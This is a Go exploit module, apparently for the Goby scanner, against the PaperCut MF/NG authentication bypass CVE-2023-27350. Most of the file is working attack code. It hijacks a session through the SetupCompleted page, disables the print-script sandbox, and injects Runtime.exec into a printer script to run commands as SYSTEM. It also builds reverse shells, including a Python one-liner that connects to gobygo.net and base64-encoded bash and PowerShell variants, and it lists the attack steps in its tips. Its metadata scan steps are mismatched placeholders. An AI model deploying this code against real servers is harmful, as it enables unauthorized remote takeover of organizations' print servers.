package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "PaperCut  /app Code Execution Vulnerability(CVE-2023-27350)",
    "Description": "<p>PaperCut is a fully cross-platform print management software solution. </p><p>PaperCut MF/NG contains an improper access control vulnerability within the SetupCompleted class that allows authentication bypass and code execution in the context of SYSTEM.</p>",
    "Product": "PaperCut-Software",
    "Homepage": "https://www.papercut.com/zh-cn/",
    "DisclosureDate": "2023-04-14",
    "PostTime": "2024-07-01",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"PaperCut\" && body=\"/js/lib/underscore/underscore-min.js\"",
    "GobyQuery": "title=\"PaperCut\" && body=\"/js/lib/underscore/underscore-min.js\"",
    "Level": "3",
    "Impact": "<p>PaperCut MF/NG contains an improper access control vulnerability within the SetupCompleted class that allows authentication bypass and code execution in the context of SYSTEM.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.papercut.com/\">https://www.papercut.com/</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-27350",
        "https://avd.aliyun.com/detail?id=AVD-2023-27350",
        "https://www.freebuf.com/articles/network/373707.html",
        ""
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,tips",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ping -c 1 your-ip",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution",
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2023-27350"
    ],
    "CNNVD": [
        "CNNVD-202304-1720"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "PaperCut /app 代码执行漏洞（CVE-2023-27350）",
            "Product": "PaperCut-Software",
            "Description": "<p>PaperCut 是一款企业打印管理软件，有 PaperCut NG 与 PaperCut MF 两款软件。除了管理打印之外，也可以通过硬件集成来管理扫描、复印与传真。</p><p>PaperCut MF 与 PaperCut NG 中发现了远程执行代码漏洞，影响 22.0.9 以及更早版本。利用此漏洞不需要身份验证。特定缺陷存在于 SetupCompleted 类中。该问题是由不正确的访问控制引起的。攻击者可利用此漏洞绕过身份验证，并在 SYSTEM 上下文中执行任意代码。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.papercut.com/zh-cn/\">https://www.papercut.com/zh-cn/</a><br></p>",
            "Impact": "<p>攻击者可利用此漏洞绕过身份验证，并在 SYSTEM 上下文中执行任意代码。<br></p>",
            "VulType": [
                "未授权访问",
                "代码执行"
            ],
            "Tags": [
                "未授权访问",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PaperCut  /app Code Execution Vulnerability(CVE-2023-27350)",
            "Product": "PaperCut-Software",
            "Description": "<p>PaperCut is a fully cross-platform print management software solution.&nbsp;<br></p><p>PaperCut MF/NG contains an improper access control vulnerability within the SetupCompleted class that allows authentication bypass and code execution in the context of SYSTEM.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.papercut.com/\">https://www.papercut.com/</a><br></p>",
            "Impact": "<p>PaperCut MF/NG contains an improper access control vulnerability within the SetupCompleted class that allows authentication bypass and code execution in the context of SYSTEM.<br></p>",
            "VulType": [
                "Code Execution",
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10965"
}`
	setPayloadRequestHash4534 := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		setSetting := func(hostInfo *httpclient.FixUrl, session string, setting string, enabled string) bool {
			makeRequest := httpclient.NewPostRequestConfig("/app")
			makeRequest.FollowRedirect = false
			makeRequest.VerifyTls = false
			makeRequest.Timeout = 10
			makeRequest.Header.Store("Origin", hostInfo.FixedHostInfo)
			makeRequest.Header.Store("Cookie", "JSESSIONID="+session)
			makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			makeRequest.Data = `service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField=` + setting + `&doQuickFind=Go`
			if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
				if resp.StatusCode == 200 {
					makeRequest.Data = `service=direct%2F1%2FConfigEditor%2F%24Form&sp=S1&Form1=%24TextField%240%2C%24Submit%2C%24Submit%240&%24TextField%240=` + enabled + `&%24Submit=Update`
					if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
						if resp.StatusCode == 200 {
							return true
						}
					}
				}
			}
			return false
		}
		
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL = "/app?service=page/SetupCompleted"
		makeRequest := httpclient.NewGetRequestConfig(vulURL)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 200 && (strings.Contains(resp.RawBody, "Setup completed") || strings.Contains(resp.RawBody, "Setup Complete")) {
				header := resp.HeaderString.String()
				jessionid := ""
				//从header中匹配获得JSESSIONID=node0ddnz4auu74nz1gi45ba7ziwer55115.node0;形式的jessionid
				jessionid = strings.Split(strings.Split(header, "JSESSIONID=")[1], ";")[0]
				makeRequest.URI = "/app?service=page/PrinterList"
				makeRequest.Header.Store("Origin", hostInfo.FixedHostInfo)
				makeRequest.Header.Store("Cookie", "JSESSIONID="+jessionid)
				if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Printer List</title>") {
						if command == "nocommand" {
							ok = true
							return ok, vulURL, nil
						} else if strings.Contains(resp.RawBody, "l1001") {
							ok=setSetting(hostInfo, jessionid, "print-and-device.script.enabled", "Y")
							ok=setSetting(hostInfo, jessionid, "print.script.sandboxed", "N")
							makeRequest.URI = "/app?service=direct/1/PrinterList/selectPrinter&sp=l1001"
							_, err2 := httpclient.DoHttpRequest(hostInfo, makeRequest)
							if err2 != nil {
								ok = false
								return ok, "利用失败", err2
							}
							makeRequest2 := httpclient.NewPostRequestConfig("/app")
							makeRequest2.FollowRedirect = false
							makeRequest2.VerifyTls = false
							makeRequest2.Timeout = 10
							makeRequest2.Header.Store("Origin", hostInfo.FixedHostInfo)
							makeRequest2.Header.Store("Cookie", "JSESSIONID="+jessionid)
							makeRequest2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							//将commond的"替换为\",并进行url编码
							command = strings.Replace(command, "\"", "\\\"", -1)
							command = url.QueryEscape(command)
							makeRequest2.Data = `service=direct%2F1%2FPrinterDetails%2F%24PrinterDetailsScript.%24Form&sp=S0&Form0=printerId%2CenablePrintScript%2CscriptBody%2C%24Submit%2C%24Submit%240%2C%24Submit%241&printerId=l1001&enablePrintScript=on&scriptBody=function+printJobHook%28inputs%2C+actions%29+%7B%7D%0D%0Ajava.lang.Runtime.getRuntime%28%29.exec%28%22` + command + `%22%29%3B&%24Submit%241=Apply`
							res:= ""
							if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest2); err == nil {
								if resp.StatusCode == 200 {
									//对响应包进行正则匹配
									if strings.Contains(resp.RawBody, "class=\"errorMessage\"") {
										re, _ := regexp.Compile(`class="errorMessage">((.|\n)*?)<td>((.|\n)*?)<\/td>((.|\n)*?)<td>((.|\n)*?)<\/td>`)
										matches := re.FindAllStringSubmatch(resp.RawBody, -1)
										captureGroup7 := matches[0][7]
										ok = false
										res = captureGroup7
									} else {
										ok = true
										res = "命令已执行,该漏洞无回显,请自行判断执行效果"
									}
								}
							}
							makeRequest2.Data = `service=direct%2F1%2FPrinterDetails%2F%24PrinterDetailsScript.%24Form&sp=S0&Form0=printerId%2CenablePrintScript%2CscriptBody%2C%24Submit%2C%24Submit%240%2C%24Submit%241&printerId=l1001&enablePrintScript=on&scriptBody=`
							_, _ = httpclient.DoHttpRequest(hostInfo, makeRequest2);
							setSetting(hostInfo, jessionid, "print-and-device.script.enabled", "N")
							setSetting(hostInfo, jessionid, "print.script.sandboxed", "Y")
							return ok, res, err
						}
					}
				}
			}
		}
		ok = false
		return ok, "利用失败", err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHash4534

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			//无需使用代码执行的方式验证漏洞，直接访问页面即可
			pocCommand := "nocommand"
			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if ok {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHash4534

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, res, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = res
			case "tips":
				//配置命令
				expResult.Success = true
				expResult.Output = `1.GET访问/app?service=page/SetupCompleted获得进入后台的cookie
2.GET访问/app?service=page/PrinterList进入后台,获得打印机列表
3.进入一台打印机开启脚本撰写功能，在其中写入并执行代码。
        `
				return expResult
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
